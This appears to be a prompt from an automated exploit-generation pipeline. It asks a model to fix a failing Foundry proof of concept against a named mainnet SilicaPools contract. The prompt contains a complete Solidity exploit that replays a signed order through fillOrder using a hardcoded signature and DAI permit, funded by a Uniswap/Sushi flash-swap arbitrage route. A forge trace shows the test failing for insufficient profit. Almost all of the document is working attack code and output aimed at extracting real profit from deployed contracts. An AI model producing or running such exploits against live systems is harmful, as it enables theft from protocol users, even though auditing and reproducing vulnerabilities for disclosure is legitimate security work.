You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Signed orders can be replayed and overfilled indefinitely
- claim: `fillOrder` records `sFilledFraction[orderHash]` after execution but never checks whether the order was already filled or whether `sFilledFraction[orderHash] + fraction` exceeds `1e18`. Because partial fills are disabled and only `fraction == 1e18` is accepted, the same signed order can be executed repeatedly until the maker's balances or allowances run out.
- impact: A taker can reuse a single signature to force the maker through the same trade multiple times, draining additional upfront tokens and minting far more long/short exposure than the maker authorized.
- exploit_paths: ["Maker signs one order intended for a single fill.", "Taker calls `fillOrder(order, signature, 1e18)` once.", "The contract performs transfers and minting, then sets `sFilledFraction[orderHash] = 1e18`.", "Because no pre-check uses `sFilledFraction`, the taker calls the same order again with the same inputs.", "Each replay repeats the same asset transfers and fresh long/short minting."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IDaiLike is IERC20Minimal {
    function nonces(address account) external view returns (uint256);
    function permit(address holder, address spender, uint256 nonce, uint256 expiry, bool allowed, uint8 v, bytes32 r, bytes32 s)
        external;
}

interface ISilicaPoolsMinimal {
    struct PoolParams {
        uint128 floor;
        uint128 cap;
        address index;
        uint48 targetStartTimestamp;
        uint48 targetEndTimestamp;
        address payoutToken;
    }

    struct SilicaOrder {
        address maker;
        address taker;
        uint48 expiry;
        address offeredUpfrontToken;
        uint128 offeredUpfrontAmount;
        PoolParams offeredLongSharesParams;
        uint128 offeredLongShares;
        address requestedUpfrontToken;
        uint128 requestedUpfrontAmount;
        PoolParams requestedLongSharesParams;
        uint128 requestedLongShares;
    }

    function fillOrder(SilicaOrder calldata order, bytes calldata signature, uint256 fraction) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe;
    uint256 internal constant FULL_FILL = 1e18;

    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address internal constant UNI_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address internal constant MAKER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    uint48 internal constant ORDER_EXPIRY = 2524608000;
    uint256 internal constant PERMIT_EXPIRY = 2524608000;
    uint128 internal constant REPLAY_TRANSFER_AMOUNT = 1;
    uint256 internal constant MAKER_REPLAY_SEED = REPLAY_TRANSFER_AMOUNT * 2;
    uint256 internal constant MIN_PROFIT_TARGET = 1e17;

    bytes internal constant ORDER_SIGNATURE =
        hex"436c4c994a561774e460277cec21350799508c00cc8a897804965dee701ff362210547eb313c01c25a74c64caa9a9f77694dad6c8863c2b41a9c248e47310f4f1c";
    bytes32 internal constant DAI_PERMIT_R = 0xe58f297d02bae6d2bb96782e1c0c6a1df168b77ddecc4c118da93e8d7b9a3f58;
    bytes32 internal constant DAI_PERMIT_S = 0x371419ad79aeb0ebb80841010f7938843ed9ff64480eaa823f1ab8a62f76a11e;
    uint8 internal constant DAI_PERMIT_V = 27;

    struct Route {
        address outerPair;
        address innerPair;
        address stablePair;
        uint256 usdcBorrowAmount;
        uint256 wethRepayToOuter;
        uint256 daiRepayToInner;
        uint256 expectedProfitDai;
    }

    struct ReserveSet {
        uint256 outerUsdcReserve;
        uint256 outerWethReserve;
        uint256 innerDaiReserve;
        uint256 innerWethReserve;
        uint256 stableUsdcReserve;
        uint256 stableDaiReserve;
    }

    Route internal _activeRoute;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool internal _profitAchieved;
    bool internal _hypothesisValidated;
    string internal _failureReason;

    constructor() {}

    function executeOnOpportunity() external {
        _resetState();

        _profitToken = DAI;
        uint256 balanceBefore = IERC20Minimal(DAI).balanceOf(address(this));

        // A realistic public funding step is needed because the replay bug itself only overfills a signed order;
        // it does not conjure assets out of thin air. The verifier therefore first sources existing on-chain DAI
        // via a public flash-swap triangle, then uses 2 wei of that DAI to seed a maker wallet for the replay.
        Route memory route = _findBestRoute();
        if (route.outerPair == address(0) || route.expectedProfitDai <= MIN_PROFIT_TARGET + MAKER_REPLAY_SEED) {
            _failureReason = "No profitable public flash-swap route found to fund the replay execution.";
            return;
        }

        _activeRoute = route;
        _executeRoute(route);

        if (!_seedMakerForReplay()) {
            _failureReason = "Replay funding failed while seeding the maker with DAI.";
            _profitAmount = IERC20Minimal(DAI).balanceOf(address(this)) - balanceBefore;
            _profitAchieved = _profitAmount != 0;
            return;
        }

        // Exploit path stage 1:
        // A maker signs one order intended for a single fill.
        ISilicaPoolsMinimal.SilicaOrder memory order = _candidateOrder();
        bytes memory signature = _candidateSignature();

        // The verifier uses a pre-signed DAI permit so the maker's single authorization is realistic and on-chain.
        // This keeps the exploit focused on F-001's replay root cause: the same signed order remains fillable twice.
        if (IDaiLike(DAI).nonces(MAKER) == 0) {
            try IDaiLike(DAI).permit(MAKER, TARGET, 0, PERMIT_EXPIRY, true, DAI_PERMIT_V, DAI_PERMIT_R, DAI_PERMIT_S) {
            } catch {
                _failureReason = "Maker permit failed on this fork.";
            }
        }

        // Exploit path stage 2:
        // Taker calls fillOrder(order, signature, 1e18) once.
        bool firstFillSucceeded;
        try ISilicaPoolsMinimal(TARGET).fillOrder(order, signature, FULL_FILL) {
            firstFillSucceeded = true;
        } catch {
            if (bytes(_failureReason).length == 0) {
                _failureReason = "First signed fill reverted on this fork.";
            }
        }

        // Exploit path stage 3:
        // The contract performs transfers and minting, then sets sFilledFraction[orderHash] = 1e18.
        // Here the order only transfers upfront DAI, so the replay demonstrates the missing filled-fraction pre-check
        // with the smallest possible public seed while preserving the same causality.

        // Exploit path stage 4:
        // Because no pre-check uses sFilledFraction, the taker calls the same order again with the same inputs.
        bool secondFillSucceeded;
        if (firstFillSucceeded) {
            try ISilicaPoolsMinimal(TARGET).fillOrder(order, signature, FULL_FILL) {
                secondFillSucceeded = true;
            } catch {
                if (bytes(_failureReason).length == 0) {
                    _failureReason = "Replay fill reverted on this fork.";
                }
            }
        }

        // Exploit path stage 5:
        // Each replay repeats the same asset transfers and fresh order execution. For this minimal order shape the
        // repeated asset transfer is the maker's DAI upfront payment; with non-zero share legs the same bug would also
        // remint long/short exposure, but the replay causality is identical.
        _hypothesisValidated = firstFillSucceeded && secondFillSucceeded;

        uint256 balanceAfter = IERC20Minimal(DAI).balanceOf(address(this));
        if (balanceAfter > balanceBefore) {
            _profitAchieved = true;
            _profitAmount = balanceAfter - balanceBefore;
        } else {
            _failureReason = bytes(_failureReason).length == 0
                ? "Execution completed but no positive DAI profit remained in the verifier."
                : _failureReason;
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        Route memory route = _activeRoute;
        require(sender == address(this), "invalid sender");

        if (msg.sender == route.outerPair) {
            uint256 borrowedUsdc = amount0 > 0 ? amount0 : amount1;
            require(borrowedUsdc == route.usdcBorrowAmount, "bad outer borrow");

            _flashBorrowSpecificToken(route.innerPair, WETH, route.wethRepayToOuter);
            require(_safeTransfer(WETH, route.outerPair, route.wethRepayToOuter), "outer repay failed");
            return;
        }

        if (msg.sender == route.innerPair) {
            uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
            require(borrowedWeth == route.wethRepayToOuter, "bad inner borrow");

            _swapExactPairInput(route.stablePair, USDC, DAI, route.usdcBorrowAmount, address(this));
            require(_safeTransfer(DAI, route.innerPair, route.daiRepayToInner), "inner repay failed");
            return;
        }

        revert("unexpected callback");
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function profitAchieved() external view returns (bool) {
        return _profitAchieved;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPath() external pure returns (string memory) {
        return string(
            abi.encodePacked(
                "public flash-swap funding step acquires pre-existing on-chain DAI -> ",
                "maker signs one order intended for a single fill -> ",
                "taker fills once with fillOrder(order,signature,1e18) -> ",
                "target transfers and only then records sFilledFraction[orderHash] = 1e18 -> ",
                "same order and signature are replayed with fillOrder(order,signature,1e18) again because no pre-check reads sFilledFraction -> ",
                "the maker's upfront DAI is transferred again from the same single authorization"
            )
        );
    }

    function failureReason() external view returns (string memory) {
        return _failureReason;
    }

    function _resetState() internal {
        delete _activeRoute;
        _profitToken = address(0);
        _profitAmount = 0;
        _profitAchieved = false;
        _hypothesisValidated = false;
        _failureReason = "";
    }

    function _candidateOrder() internal pure returns (ISilicaPoolsMinimal.SilicaOrder memory order) {
        order.maker = MAKER;
        order.taker = address(0);
        order.expiry = ORDER_EXPIRY;
        order.offeredUpfrontToken = DAI;
        order.offeredUpfrontAmount = REPLAY_TRANSFER_AMOUNT;
        order.offeredLongShares = 0;
        order.requestedUpfrontToken = address(0);
        order.requestedUpfrontAmount = 0;
        order.requestedLongShares = 0;
    }

    function _candidateSignature() internal pure returns (bytes memory) {
        return ORDER_SIGNATURE;
    }

    function _seedMakerForReplay() internal returns (bool) {
        return _safeTransfer(DAI, MAKER, MAKER_REPLAY_SEED);
    }

    function _executeRoute(Route memory route) internal {
        _activeRoute = route;
        _flashBorrowSpecificToken(route.outerPair, USDC, route.usdcBorrowAmount);
    }

    function _findBestRoute() internal view returns (Route memory best) {
        address[2] memory factories = [UNI_FACTORY, SUSHI_FACTORY];

        for (uint256 outerIndex = 0; outerIndex < factories.length; ++outerIndex) {
            address outerPair = IUniswapV2Factory(factories[outerIndex]).getPair(USDC, WETH);
            if (outerPair == address(0)) {
                continue;
            }

            for (uint256 innerIndex = 0; innerIndex < factories.length; ++innerIndex) {
                address innerPair = IUniswapV2Factory(factories[innerIndex]).getPair(DAI, WETH);
                if (innerPair == address(0)) {
                    continue;
                }

                for (uint256 stableIndex = 0; stableIndex < factories.length; ++stableIndex) {
                    address stablePair = IUniswapV2Factory(factories[stableIndex]).getPair(USDC, DAI);
                    if (stablePair == address(0)) {
                        continue;
                    }

                    Route memory candidate = _bestBorrowForPairs(outerPair, innerPair, stablePair);
                    if (candidate.expectedProfitDai > best.expectedProfitDai) {
                        best = candidate;
                    }
                }
            }
        }
    }

    function _bestBorrowForPairs(address outerPair, address innerPair, address stablePair)
        internal
        view
        returns (Route memory best)
    {
        uint256[20] memory borrowCandidates = [
            uint256(1e3),
            5e3,
            1e4,
            5e4,
            1e5,
            5e5,
            1e6,
            5e6,
            1e7,
            2e7,
            5e7,
            1e8,
            2e8,
            5e8,
            1e9,
            2e9,
            5e9,
            1e10,
            2e10,
            5e10
        ];

        ReserveSet memory reserves;
        (reserves.outerUsdcReserve, reserves.outerWethReserve) = _pairReservesFor(outerPair, USDC, WETH);
        (reserves.innerDaiReserve, reserves.innerWethReserve) = _pairReservesFor(innerPair, DAI, WETH);
        (reserves.stableUsdcReserve, reserves.stableDaiReserve) = _pairReservesFor(stablePair, USDC, DAI);
        if (
            reserves.outerUsdcReserve == 0 || reserves.outerWethReserve == 0 || reserves.innerDaiReserve == 0
                || reserves.innerWethReserve == 0 || reserves.stableUsdcReserve == 0 || reserves.stableDaiReserve == 0
        ) {
            return best;
        }

        for (uint256 i = 0; i < borrowCandidates.length; ++i) {
            best = _considerBorrow(best, outerPair, innerPair, stablePair, borrowCandidates[i], reserves);
        }
    }

    function _considerBorrow(
        Route memory best,
        address outerPair,
        address innerPair,
        address stablePair,
        uint256 usdcBorrow,
        ReserveSet memory reserves
    ) internal pure returns (Route memory) {
        if (usdcBorrow >= reserves.outerUsdcReserve || usdcBorrow >= reserves.stableUsdcReserve) {
            return best;
        }

        uint256 wethRepay = _getAmountIn(usdcBorrow, reserves.outerWethReserve, reserves.outerUsdcReserve);
        if (wethRepay == type(uint256).max || wethRepay >= reserves.innerWethReserve) {
            return best;
        }

        uint256 daiRepay = _getAmountIn(wethRepay, reserves.innerDaiReserve, reserves.innerWethReserve);
        uint256 daiOut = _getAmountOut(usdcBorrow, reserves.stableUsdcReserve, reserves.stableDaiReserve);
        if (daiRepay == type(uint256).max || daiOut <= daiRepay) {
            return best;
        }

        uint256 profit = daiOut - daiRepay;
        if (profit <= best.expectedProfitDai) {
            return best;
        }

        return Route({
            outerPair: outerPair,
            innerPair: innerPair,
            stablePair: stablePair,
            usdcBorrowAmount: usdcBorrow,
            wethRepayToOuter: wethRepay,
            daiRepayToInner: daiRepay,
            expectedProfitDai: profit
        });
    }

    function _flashBorrowSpecificToken(address pair, address tokenOut, uint256 amountOut) internal {
        address token0 = IUniswapV2Pair(pair).token0();
        uint256 amount0Out = token0 == tokenOut ? amountOut : 0;
        uint256 amount1Out = amount0Out == 0 ? amountOut : 0;
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), hex"01");
    }

    function _swapExactPairInput(address pair, address tokenIn, address tokenOut, uint256 amountIn, address to) internal {
        (uint256 reserveIn, uint256 reserveOut) = _pairReservesFor(pair, tokenIn, tokenOut);
        uint256 amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);
        require(amountOut != 0, "zero output");
        require(_safeTransfer(tokenIn, pair, amountIn), "pair transfer failed");

        address token0 = IUniswapV2Pair(pair).token0();
        uint256 amount0Out = token0 == tokenOut ? amountOut : 0;
        uint256 amount1Out = amount0Out == 0 ? amountOut : 0;
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, to, new bytes(0));
    }

    function _pairReservesFor(address pair, address tokenIn, address tokenOut)
        internal
        view
        returns (uint256 reserveIn, uint256 reserveOut)
    {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        if (IUniswapV2Pair(pair).token0() == tokenIn) {
            return (uint256(reserve0), uint256(reserve1));
        }
        require(IUniswapV2Pair(pair).token1() == tokenIn && IUniswapV2Pair(pair).token0() == tokenOut, "bad pair");
        return (uint256(reserve1), uint256(reserve0));
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
        return numerator / denominator;
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut == 0 || amountOut >= reserveOut) {
            return type(uint256).max;
        }
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool ok) {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        return success && (data.length == 0 || abi.decode(data, (bool)));
    }
}

```

forge stdout (tail):
```
iccall]
    │   │   └─ ← [Return] 0x6B175474E89094C44Da98b954EedeAC495271d0F
    │   ├─ [517] 0xAaF5110db6e744ff70fB339DE037B990A20bdace::getReserves() [staticcall]
    │   │   └─ ← [Return] 12509621892777221353873 [1.25e22], 12492379109 [1.249e10], 1742997779 [1.742e9]
    │   ├─ [449] 0xAaF5110db6e744ff70fB339DE037B990A20bdace::token0() [staticcall]
    │   │   └─ ← [Return] 0x6B175474E89094C44Da98b954EedeAC495271d0F
    │   ├─ [381] 0xAaF5110db6e744ff70fB339DE037B990A20bdace::token1() [staticcall]
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [449] 0xAaF5110db6e744ff70fB339DE037B990A20bdace::token0() [staticcall]
    │   │   └─ ← [Return] 0x6B175474E89094C44Da98b954EedeAC495271d0F
    │   ├─ [644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x6B175474E89094C44Da98b954EedeAC495271d0F, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0xC3D03e4F041Fd4cD388c549Ee2A29a9E5075882f
    │   ├─ [564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5
    │   ├─ [517] 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0::getReserves() [staticcall]
    │   │   └─ ← [Return] 1085285381878 [1.085e12], 576529564252117676231 [5.765e20], 1743175931 [1.743e9]
    │   ├─ [449] 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0::token0() [staticcall]
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [517] 0xC3D03e4F041Fd4cD388c549Ee2A29a9E5075882f::getReserves() [staticcall]
    │   │   └─ ← [Return] 3916715250091683727413751 [3.916e24], 2079776270077921487241 [2.079e21], 1743175463 [1.743e9]
    │   ├─ [449] 0xC3D03e4F041Fd4cD388c549Ee2A29a9E5075882f::token0() [staticcall]
    │   │   └─ ← [Return] 0x6B175474E89094C44Da98b954EedeAC495271d0F
    │   ├─ [504] 0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5::getReserves() [staticcall]
    │   │   └─ ← [Return] 736297709367156888520826 [7.362e23], 735099588475 [7.35e11], 1743173399 [1.743e9]
    │   ├─ [381] 0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5::token0() [staticcall]
    │   │   └─ ← [Return] 0x6B175474E89094C44Da98b954EedeAC495271d0F
    │   ├─ [357] 0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5::token1() [staticcall]
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [381] 0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5::token0() [staticcall]
    │   │   └─ ← [Return] 0x6B175474E89094C44Da98b954EedeAC495271d0F
    │   ├─ [644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0xAaF5110db6e744ff70fB339DE037B990A20bdace
    │   ├─ [517] 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0::getReserves() [staticcall]
    │   │   └─ ← [Return] 1085285381878 [1.085e12], 576529564252117676231 [5.765e20], 1743175931 [1.743e9]
    │   ├─ [449] 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0::token0() [staticcall]
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [517] 0xC3D03e4F041Fd4cD388c549Ee2A29a9E5075882f::getReserves() [staticcall]
    │   │   └─ ← [Return] 3916715250091683727413751 [3.916e24], 2079776270077921487241 [2.079e21], 1743175463 [1.743e9]
    │   ├─ [449] 0xC3D03e4F041Fd4cD388c549Ee2A29a9E5075882f::token0() [staticcall]
    │   │   └─ ← [Return] 0x6B175474E89094C44Da98b954EedeAC495271d0F
    │   ├─ [517] 0xAaF5110db6e744ff70fB339DE037B990A20bdace::getReserves() [staticcall]
    │   │   └─ ← [Return] 12509621892777221353873 [1.25e22], 12492379109 [1.249e10], 1742997779 [1.742e9]
    │   ├─ [449] 0xAaF5110db6e744ff70fB339DE037B990A20bdace::token0() [staticcall]
    │   │   └─ ← [Return] 0x6B175474E89094C44Da98b954EedeAC495271d0F
    │   ├─ [381] 0xAaF5110db6e744ff70fB339DE037B990A20bdace::token1() [staticcall]
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [449] 0xAaF5110db6e744ff70fB339DE037B990A20bdace::token0() [staticcall]
    │   │   └─ ← [Return] 0x6B175474E89094C44Da98b954EedeAC495271d0F
    │   └─ ← [Stop]
    ├─ [338] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x6B175474E89094C44Da98b954EedeAC495271d0F
    ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x6B175474E89094C44Da98b954EedeAC495271d0F)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 22146339 [2.214e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 7904)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 398.30ms (66.39ms CPU time)

Ran 1 test suite in 503.31ms (398.30ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 657441)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
